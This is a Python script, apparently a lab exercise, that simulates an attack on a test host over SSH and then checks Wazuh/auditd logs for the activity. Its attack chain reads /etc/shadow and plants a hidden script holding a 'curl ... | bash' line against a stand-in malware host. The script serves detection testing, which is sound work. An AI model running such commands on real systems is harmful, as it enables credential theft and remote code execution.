import json
import subprocess
import time
import os

# --- CONFIGURACIÓN ---
MANAGER_IP = "10.0.2.160"
VICTIM_IP = "10.0.2.23"
SSH_KEY = os.path.expanduser("~/.ssh/my_key")
LOG_FILE = "/var/ossec/logs/archives/archives.json"

def run_ssh_cmd(ip, user, command, use_sudo=False):
    sudo_prefix = "sudo " if use_sudo else ""
    # Agregamos parámetros para que SSH no se quede colgado y use la llave
    ssh_base = f"ssh -i {SSH_KEY} -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@{ip}"
    full_cmd = f"{ssh_base} \"{sudo_prefix}{command}\""
    return subprocess.run(full_cmd, shell=True, capture_output=True, text=True)

def inject_attack():
    print(f"[*] 🚀 Lanzando ataque simulado en {VICTIM_IP}...")
    # Escapamos correctamente los pipes y redirecciones
    cmds = [
        "whoami",
        "sudo -l",
        "sudo cat /etc/shadow",
        "echo 'curl http://ataque.com/malware | bash' > /tmp/.hidden_script.sh",
        "chmod +x /tmp/.hidden_script.sh"
    ]
    attack_chain = " && ".join(cmds)
    res = run_ssh_cmd(VICTIM_IP, "debian", attack_chain)
    
    if res.returncode == 0:
        print("[+] Ataque ejecutado con éxito.")
    else:
        print(f"[!] Nota: Algunos comandos fallaron o ya existían.")

def analyze():
    print(f"\n--- 🕵️ REPORTE FORENSE FILTRADO (Solo actividad humana) ---")
    
    # MEJORA: Filtramos el AUID 4294967295 (procesos de sistema/Wazuh) directamente en el grep
    # Esto limpia el 90% del ruido que viste antes
    grep_cmd = f"grep -E 'forensic_cmds|forensic_shadow' {LOG_FILE} | grep -v '4294967295'"
    res = run_ssh_cmd(MANAGER_IP, "ubuntu", grep_cmd, use_sudo=True)
    
    if not res.stdout.strip():
        print("[!] No se encontraron evidencias humanas. Revisa la config de Auditd.")
        return

    print(f"{'HORA':<12} | {'USUARIO':<10} | {'ACTIVIDAD':<20} | {'BINARIO'}")
    print("-" * 90)

    for line in res.stdout.splitlines():
        try:
            data = json.loads(line)
            audit = data['data']['audit']
            
            ts = data.get('timestamp', 'N/A')[11:19] 
            auid = audit.get('auid', '???')
            key = audit.get('key', '???')
            exe = audit.get('exe', '???')

            # Traducimos el AUID 1000 a algo legible
            user = "Atacante (1000)" if auid == "1000" else f"UID {auid}"
            
            # Resaltado visual de severidad
            if key == "forensic_shadow":
                key_str = f"🛑 CRÍTICO: {key}"
            else:
                key_str = f"⚠️ SOSPECHA: {key}"
                
            print(f"{ts:<12} | {user:<10} | {key_str:<20} | {exe}")
        except:
            continue

if __name__ == "__main__":
    inject_attack()
    print("[*] Sincronizando logs...")
    time.sleep(4)
    analyze()